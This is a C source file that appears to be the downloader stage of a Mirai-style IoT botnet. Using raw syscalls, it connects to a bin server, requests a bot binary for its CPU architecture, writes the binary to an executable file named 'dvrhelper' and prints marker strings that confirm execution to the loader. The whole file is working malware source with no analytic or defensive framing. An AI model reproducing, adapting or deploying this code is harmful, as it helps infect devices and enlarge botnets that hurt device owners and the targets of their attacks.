#define _GNU_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define BIN_SERVER utils_inet_addr(127,0,0,1)
#define BIN_PORT 34132

#define EXEC_MSG            "FmbNet\n"
#define EXEC_MSG_LEN        7

#define DOWNLOAD_MSG        "fnb\n"
#define DOWNLOAD_MSG_LEN    4

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#if BYTE_ORDER == BIG_ENDIAN
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | ((((unsigned short)(n) & 0xff00) >> 8)))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
                  ((((unsigned long)(n) & 0xff00)) << 8) | \
                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error "Fix byteorder"
#endif

#ifdef __ARM_EABI__
#define SCN(n) ((n) & 0xfffff)
#else
#define SCN(n) (n)
#endif

#ifndef AT_FDCWD
#define AT_FDCWD (-100)
#endif

void run(void);
int sstrlen(char *);
unsigned int utils_inet_addr(unsigned char, unsigned char, unsigned char, unsigned char);

int xsocket(int, int, int);
int xwrite(int, void *, int);
int xread(int, void *, int);
int xconnect(int, struct sockaddr_in *, int);
int xopen(char *, int, int);
int xclose(int);
void x__exit(int);

#define socket xsocket
#define write xwrite
#define read xread
#define connect xconnect
#define open xopen
#define close xclose
#define __exit x__exit

void __start(void)
{ 
#if defined(MIPS) || defined(MIPSEL)
    __asm(
        ".set noreorder\n"
        "move $0, $31\n"
        "bal 10f\n"
        "nop\n"
        "10:\n.cpload $31\n"
        "move $31, $0\n"
        ".set reorder\n"
    );
#endif
    run();
}

static int read_all(int fd, char *buf, int len)
{
    int total = 0;
    while (total < len) {
        int r = read(fd, buf + total, len - total);
        if (r <= 0)
            return -1;
        total += r;
    }
    return total;
}

void run(void)
{
    char recvbuf[1024];
    struct sockaddr_in addr;
    int sfd, ffd, ret;
    int arch_strlen = sstrlen(BOT_ARCH);
    unsigned int total_size = 0;
    unsigned int received = 0;

    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET;
    addr.sin_port = HTONS(BIN_PORT);
    addr.sin_addr.s_addr = BIN_SERVER;

    ffd = open("dvrhelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);

    sfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sfd == -1 || ffd == -1)
        __exit(1);

    if ((ret = connect(sfd, &addr, sizeof(struct sockaddr_in))) < 0)
    {
        write(STDOUT, "NIF\n", 5);
        __exit(-ret);
    }

    // send request: [arch_len:2][arch]
    unsigned char req[64];
    req[0] = (arch_strlen >> 8) & 0xff;
    req[1] = arch_strlen & 0xff;
    int i;
    for (i = 0; i < arch_strlen; i++)
        req[2 + i] = BOT_ARCH[i];

    if (write(sfd, req, 2 + arch_strlen) != 2 + arch_strlen)
        __exit(3);

    // read response chunks
    while (1)
    {
        // read header: [total_size:4][offset:4][data_len:2]
        if (read_all(sfd, recvbuf, 10) != 10)
            break;

        unsigned int chunk_total = ((unsigned char)recvbuf[0] << 24) |
                                   ((unsigned char)recvbuf[1] << 16) |
                                   ((unsigned char)recvbuf[2] << 8) |
                                   recvbuf[3];
        unsigned int offset = ((unsigned char)recvbuf[4] << 24) |
                              ((unsigned char)recvbuf[5] << 16) |
                              ((unsigned char)recvbuf[6] << 8) |
                              recvbuf[7];
        unsigned int data_len = ((unsigned char)recvbuf[8] << 8) |
                                recvbuf[9];

        if (chunk_total == 0)
            break;

        if (total_size == 0)
            total_size = chunk_total;

        if (data_len > sizeof(recvbuf))
            break;

        // read chunk data
        if (read_all(sfd, recvbuf, data_len) != (int)data_len)
            break;

        write(ffd, recvbuf, data_len);
        received += data_len;

        if (received >= total_size)
            break;
    }

    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    __exit(5);
}

int sstrlen(char *str)
{
    int c = 0;
    while (*str++ != 0)
        c++;
    return c;
}

unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four)
{
    unsigned long ip = 0;
    ip |= (one << 24);
    ip |= (two << 16);
    ip |= (three << 8);
    ip |= (four << 0);
    return HTONL(ip);
}

int xsocket(int domain, int type, int protocol)
{
#if defined(__NR_socketcall)
    struct {
        int domain, type, protocol;
    } socketcall;
    socketcall.domain = domain;
    socketcall.type = type;
    socketcall.protocol = protocol;
    int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);
     return ret;
#else
    return syscall(SCN(SYS_socket), domain, type, protocol);
#endif
}

int xread(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_read), fd, buf, len);
}

int xwrite(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_write), fd, buf, len);
}

int xconnect(int fd, struct sockaddr_in *addr, int len)
{
#if defined(__NR_socketcall)
    struct {
        int fd;
        struct sockaddr_in *addr;
        int len;
    } socketcall;
    socketcall.fd = fd;
    socketcall.addr = addr;
    socketcall.len = len;
    int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);
    return ret;
#else
    return syscall(SCN(SYS_connect), fd, addr, len);
#endif
}

int xopen(char *path, int flags, int other)
{
#ifdef SYS_open
    return syscall(SCN(SYS_open), path, flags, other);
#else
    return syscall(SCN(SYS_openat), AT_FDCWD, path, flags, other);
#endif
}

int xclose(int fd)
{
    return syscall(SCN(SYS_close), fd);
}

void x__exit(int code)
{
    syscall(SCN(SYS_exit), code);
}
